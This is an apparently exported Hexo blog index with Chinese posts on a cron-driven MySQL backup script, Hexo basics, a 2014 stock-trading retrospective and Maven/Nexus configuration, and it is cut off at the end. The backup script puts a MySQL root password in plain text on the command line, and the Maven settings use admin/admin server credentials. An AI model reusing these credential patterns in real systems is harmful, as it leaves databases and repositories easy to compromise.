          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
            <tag> emoji </tag>
            
            <tag> utf8mb4 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL定时备份</title>
      <link href="/2016/08/10/MySQL%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD/"/>
      <url>/2016/08/10/MySQL%E5%AE%9A%E6%97%B6%E5%A4%87%E4%BB%BD/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat backup_mysql.sh</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> -p /backup/mysqloffline/</span><br><span class="line">mysqldump -uroot -p10086 -h127.0.0.1 --all-databases  &gt; /backup/mysqloffline/`<span class="built_in">date</span> +%Y%m%d`.sql</span><br><span class="line">tar czvf /backup/mysqloffline/`<span class="built_in">date</span> +%Y%m%d`.tar.gz /backup/mysqloffline/`<span class="built_in">date</span> +%Y%m%d`.sql</span><br><span class="line"><span class="built_in">rm</span> -rf /backup/mysqloffline/`<span class="built_in">date</span> +%Y%m%d`.sql</span><br><span class="line">find   /backup/mysqloffline/ -mtime +30 -name <span class="string">&#x27;*.sql&#x27;</span> -<span class="built_in">exec</span> <span class="built_in">rm</span> -rf &#123;&#125; \;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line"></span><br><span class="line"><span class="comment"># For example, you can run a backup of all your user accounts</span></span><br><span class="line"><span class="comment"># at 5 a.m every week with:</span></span><br><span class="line"><span class="comment"># 0 5 * * 1 tar -zcf /var/backups/home.tgz /home/</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># For more information see the manual pages of crontab(5) and cron(8)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># m h  dom mon dow   command</span></span><br><span class="line">30 12 * * * /root/backup_mysql.sh</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cron </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo Hello World</title>
      <link href="/2016/07/31/hexo-hello-world/"/>
      <url>/2016/07/31/hexo-hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2014年年终总结(金融篇)</title>
      <link href="/2015/01/02/2014%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93(%E9%87%91%E8%9E%8D%E7%AF%87)/"/>
      <url>/2015/01/02/2014%E5%B9%B4%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93(%E9%87%91%E8%9E%8D%E7%AF%87)/</url>
      
        <content type="html"><![CDATA[<p>在 2017-02-09 的时候，整理文件发现了这篇，好早以前写的文字。既然看到，那就保留下来吧。现在看来，只是当时2014年股市的整体就好，并不能说明什么问题。未经任何深思的投资策略都是不可取的。这也是为什么我后来回对量化交易感兴趣的原因。</p><h3 id="为啥要写这个"><a href="#为啥要写这个" class="headerlink" title="为啥要写这个?"></a>为啥要写这个?</h3><p>特殊时间节点:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">事发原因:没有开发任务在身，学学和经济和金融相关的东西，人需要有精神寄托才行</span><br><span class="line">准备购买:在5月初打算购买股票苏宁云商，</span><br><span class="line">开户时间:5月10号周六预约开户，</span><br><span class="line">开户完成:5月13号周二开户完成，准备转账入资金账号</span><br><span class="line">首次交易:周三开始准备交易等合适的价格购买苏宁。</span><br><span class="line">涉及到票:苏宁云商</span><br><span class="line">       华远地产</span><br><span class="line">       皖能电力</span><br><span class="line">       天汽模</span><br><span class="line">       雏鹰农牧</span><br><span class="line">       天津磁卡</span><br><span class="line">       九阳股份</span><br></pre></td></tr></table></figure><p>所有的票里面我是最看好苏宁的，之前研究的也不多，目前来讲是它没错。</p><p>为什么选择苏宁，第一个原因可能在于接触雪球，雪球上国内股票中苏宁的讨论最为活跃，其次，我之前也算在电商行业有过接触，再者，电商和实体离自己最近，当时苏宁正好在转型，所以一季度的股市跌的很厉害，股价差不多减半了，而最近的股价在一个区间震荡，也就是说投资者对后市的争议比较大，而较同行业其他的电商公司来讲，苏宁确实做的还不是很好，后面的发展空间也比较大，换句话说，此时介入的价格对自己来说具有一个不错的安全边际。</p><h3 id="几个正确"><a href="#几个正确" class="headerlink" title="几个正确"></a>几个正确</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">购买苏宁算是一个比较正确的决定。购买天汽模是一个比较好的投资抓消息的决定，天津磁卡，九阳也算是一个。</span><br></pre></td></tr></table></figure><h3 id="几个错误"><a href="#几个错误" class="headerlink" title="几个错误"></a>几个错误</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其中华远地产是不知道怎么就买的了，具体情况忘了，没分析，这个是损失的比较惨的一个。雏鹰农牧和皖能电力可以做T的一个，随便抓几个，但是看图感觉比较好，事实上没想象中的好，至少目前来看也不坏。</span><br></pre></td></tr></table></figure><h3 id="几个事件"><a href="#几个事件" class="headerlink" title="几个事件"></a>几个事件</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">关于推进JJJ（京津冀）经济开发区。</span><br><span class="line">全球天气变暖，未发报告，市场需要一个引爆点</span><br><span class="line">多个新股申购</span><br><span class="line">特斯拉中国合作相关</span><br></pre></td></tr></table></figure><h3 id="其他人的一些看法，关于投资方面的一些思考"><a href="#其他人的一些看法，关于投资方面的一些思考" class="headerlink" title="其他人的一些看法，关于投资方面的一些思考:"></a>其他人的一些看法，关于投资方面的一些思考:</h3><ol><li><p>选准好行业、好龙头，在买入的价格不要纠结，只要看天花板足够高，在一个合适的价格，有一定安全边际的时候大胆买入。</p></li><li><p>关于能力圈：不要敬畏，只要对行业发展大趋势想明白了，其它不懂的想办法去搞懂。现在信息获取方便，善于利用互联网资源。</p></li><li><p>重仓一两支自己深入了解的公司，结合趋势在自己比较了解的公司进行加减仓操作。</p></li><li><p>你可抱着牛股穿越牛熊，也可以更灵活，当大熊来临时，可以反手做空。</p></li><li><p>当买入的公司发现判断错误，要果断卖出。如果只是市场情绪引起的话，要永于跟市场做斗争，敢于坚持拿到底。</p></li><li><p>不要跟风买入股票，要学会独立思考。 要永远保持对新事物好奇，学习心态。<br>  过往成功的路径依赖，曾经的投资成功后如离市场，用户越来越远会让你错失很多机会。</p></li><li><p>选好成长性的行业，选好行业里面的龙头，结合欧耐尔的趋势投资，利用期权call的操作可以提高收益。股价在爆发前都会有一些蛛丝马迹，如果能够从中寻找一些信号，那么可以获得更好的收益。</p></li><li><p>市场疯狂的时候，一定要保持头脑清晰的思路，在寻找优秀公司时，也可寻找一些烂公司（比如下个黑毒和诺基亚等）做空进行对冲。</p></li></ol><p>备注：这只是我个人投资经验的总结，未必适合所有人，投资要想赚大钱，别人的经验或经历只能借签，更重要是你自已要付出努力。</p>]]></content>
      
      
      <categories>
          
          <category> Finance </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 股票 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java开发的Maven相关</title>
      <link href="/2014/07/17/Java%E5%BC%80%E5%8F%91%E7%9A%84Maven%E7%9B%B8%E5%85%B3/"/>
      <url>/2014/07/17/Java%E5%BC%80%E5%8F%91%E7%9A%84Maven%E7%9B%B8%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h1 id="Java开发的Maven相关"><a href="#Java开发的Maven相关" class="headerlink" title="Java开发的Maven相关"></a>Java开发的Maven相关</h1><p>这里主要提到一下几方面</p><ul><li>maven下载&#x2F;安装</li><li>maven配置</li><li>常用命令</li><li>使用 Maven 创建项目</li><li>根据archtype快速创建项目</li></ul><p>Maven采用了一种被称之为project object model (POM)概念来管理项目，所有的项目配置信息都被定义在一个叫做POM.xml的文件中，通过该文件，Maven可以管理项目的整个声明周期，包括编译，构建，测试，发布，报告等等。Maven有一个好处就是不用将jar包上传到svn，当jar包很多的时候很更新较快。</p><h2 id="下载-x2F-安装"><a href="#下载-x2F-安装" class="headerlink" title="下载&#x2F;安装"></a>下载&#x2F;安装</h2><p>如果需要使用到 Maven ，必须首先安装 Maven ， Maven 的下载地址在 <a href="http://maven.apache.org/download.html">Apache Maven</a> 中有。或者去中科大镜像网站下载<a href="http://mirrors.ustc.edu.cn/apache/maven/maven-3/3.2.2/binaries/" title="maven中科大镜像">http://mirrors.ustc.edu.cn/apache/maven/maven-3/3.2.2/binaries/</a>。</p><p>下载好 Maven 后，需要简单安装下。将下载的 zip 或者 tar.gz  包解压到需要安装到的目录。 接下简单配置下环境变量：</p><ol><li>新建环境变量 <strong>M2_HOME</strong> ，输入值为 Maven 的安装目录</li><li>新建环境变量 M2，输入值为:  <strong>%M2_HOME%\bin</strong></li><li>将 M2 环境变量加入 Path 的最后，如：  <strong>;%M2%;</strong></li></ol><p>环境变量就这么简单配置下就可以了。打开命令行窗口输入  <strong>mvn -version</strong>  。可以看到如下输出：</p><p><img src="http://static.oschina.net/uploads/space/2013/0912/142441_b8hX_146430.png"></p><p>看到以上输出，您的 Maven 环境就已经搭建好了。 </p><h2 id="Maven配置"><a href="#Maven配置" class="headerlink" title="Maven配置"></a>Maven配置</h2><p>默认的安装就算完成了，你还需要再eclipse&#x2F;intellij里面将内置的maven修改为刚才安装的那个Maven。</p><p>进一步的配置需要修改MAVEN HOME下面的config&#x2F;settings.xml文件。</p><p>Maven 在222上面搭建有nexus的私服，私服地址：<a href="http://192.168.16.222:8081/nexus/index.html#welcome" title="Maven的Nexus私服">http://192.168.16.222:8081/nexus/index.html#welcome</a></p><p>在 Maven 中使用 192.168.16.222 的 Maven 私有服务还需要简单配置一下 Maven，在 Maven 的安装目录下的 conf 文件下有个  settings.xml  文件，接下来我们需要对这个文件做简单的修改，修改前您可以简单备份下该文件。这里有一个适合的setting.xml文件，点击<a href="bin/settings.xml">这里</a>查看。打开  settings.xml  文件，按下面内容修改。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">settings</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0&quot;</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>E:\.m2\repository<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br><span class="line">    ...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">servers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>releases<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>snapshots<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">servers</span>&gt;</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;<span class="name">profiles</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">profile</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>chinaroad<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>releases<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.16.222:8081/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                     <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>snapshots<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.16.222:8081/nexus/content/repositories/snapshots<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">updatePolicy</span>&gt;</span>interval:1<span class="tag">&lt;/<span class="name">updatePolicy</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>releases<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.16.222:8081/nexus/content/groups/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>false<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">id</span>&gt;</span>snapshots<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://192.168.16.222:8081/nexus/content/repositories/snapshots<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">updatePolicy</span>&gt;</span>interval:1<span class="tag">&lt;/<span class="name">updatePolicy</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">pluginRepository</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pluginRepositories</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">profiles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">activeProfiles</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activeProfile</span>&gt;</span>chinaroad<span class="tag">&lt;/<span class="name">activeProfile</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">activeProfiles</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果您需要修改 Maven 的默认文件保存路径，需要在 settings.xml 文件中修改如下地方。该目录将保存maven依赖的jar和jar对应的源码包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>F:/Maven/repo/m2/<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>这里列举出Maven在使用过程中常用的命令</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype：create           创建Maven项目</span><br><span class="line">mvn compile                     编译源代码</span><br><span class="line">mvn deploy                      发布项目</span><br><span class="line">mvn test-compile                编译测试源代码</span><br><span class="line">mvn test                        运行应用程序中的单元测试</span><br><span class="line">mvn site                        生成项目相关信息的网站</span><br><span class="line">mvn clean                       清除项目目录中的生成结果</span><br><span class="line">mvn package                     根据项目生成的jar</span><br><span class="line">mvn install                     在本地Repository中安装jar</span><br><span class="line">mvn eclipse:eclipse             生成eclipse项目文件</span><br><span class="line">mvn jetty:run                   启动jetty服务</span><br><span class="line">mvn tomcat:run                  启动tomcat服务</span><br><span class="line">mvn clean package -Dmaven.test.skip=true  清除以前的包后重新打包，跳过单元测试</span><br></pre></td></tr></table></figure><h2 id="使用-Maven-创建项目"><a href="#使用-Maven-创建项目" class="headerlink" title="使用 Maven 创建项目"></a>使用 Maven 创建项目</h2><p>您可以创建一个属于自己的 Maven 项目来简单测试一下 OSChina 的 Maven 库。创建 Maven 项目很简单，只需要简单一行命令就可以搞定。<br>下面是创建 Maven 项目的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn archetype:create -DgroupId=oschina -DartifactId=simple -DpackageName=net.oschina.simple  -DarchetypeArtifactId=maven-archetype-webapp -DinteractiveMode=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>其中 <strong>-DarchetypeArtifactId&#x3D;maven-archetype-webapp</strong>  代表创建一个简单的 webapp 项目。至于其他参数的意思，您可以查看下 Maven 的相关文档。 在您需要创建 Maven 项目的文件夹下用命令行执行以上命令。可以看到如下输出：<br><img src="http://static.oschina.net/uploads/space/2013/0912/151847_6QDI_146430.png" alt="创建输出"></p><p>如果顺利创建成功的话，你会看到如下输出:</p><p><img src="http://static.oschina.net/uploads/space/2013/0912/151859_Ce32_146430.png" alt="创建成功"></p><p>如果创建失败，就可能需要您去 Google 一下了。创建项目的时候，Maven 会下载一些需要用到的 Maven 插件。</p><h2 id="根据archtype快速创建项目"><a href="#根据archtype快速创建项目" class="headerlink" title="根据archtype快速创建项目"></a>根据archtype快速创建项目</h2><p>配置好了Maven和Eclipse中的maven后，eclipse中不要选择内置的Maven，而用自己本机的Maven，配置文件setting.xml也一样。</p><p>下面创建Maven的项目，<strong>Eclipse-&gt;New-&gt;Other-&gt;Maven-&gt;Maven Project</strong> ，选择保存的项目路径，在Select an Archtype中输入chinaroad过滤，选择最新的版本创建项目并自己想要的输入Group Id，Artifact Id，Version，Package 然后完成既可以创建项目原型。</p><p>修改项目中的配置文件名称</p><ul><li>修改<strong>logback.xml</strong>中的日志文件名称</li><li>修改<strong>config&#x2F;msgsrv.xml</strong>中的msgsrv中的信息</li><li>修改<strong>config&#x2F;datasource.properties</strong>中关于数据库连接的信息</li><li>修改<strong>pom.xml</strong>中的<strong>maven-jar-plugin</strong>中的<strong>mainClass</strong>为你的主函数路径，否则打包后无法找到Main函数</li><li>修改src&#x2F;main&#x2F;resources&#x2F;com&#x2F;* 中关于mybatis配置路径，需要和src&#x2F;main&#x2F;java&#x2F;<strong>.persistence的路径名称一致，如：</strong>com.chinaroad.test.persistence** 包对应目录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">resources</span><br><span class="line">   |-- com</span><br><span class="line">   |   `-- chinaroad</span><br><span class="line">   |       `-- <span class="built_in">test</span></span><br><span class="line">   |           `-- persistence</span><br><span class="line">   |               |-- UserMapper.xml</span><br></pre></td></tr></table></figure>  其中UserMapper.xml中的路径也要一致才行，否则无法找到该xml而报错</li><li>注意在pom.xml文件中的<strong>targetPath</strong>设置，该设置将会影响到build中获取的配置文件path不对，在eclipse中应该设置为  <strong>.&#x2F;</strong>  ，在<strong>mvn package -Dmaven.test.skip&#x3D;true</strong>的时候需要设置为  <strong>..&#x2F;</strong>  这样在打包的时候才会将依赖包放到lib目录下，在cygwin下可以运行bin&#x2F;package.sh 来打包文件<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">sourceDirectory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">sourceDirectory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/resources<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>./<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">excludes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">exclude</span>&gt;</span>**/*.java<span class="tag">&lt;/<span class="name">exclude</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">excludes</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">...</span><br><span class="line"><span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><ol><li>在<a 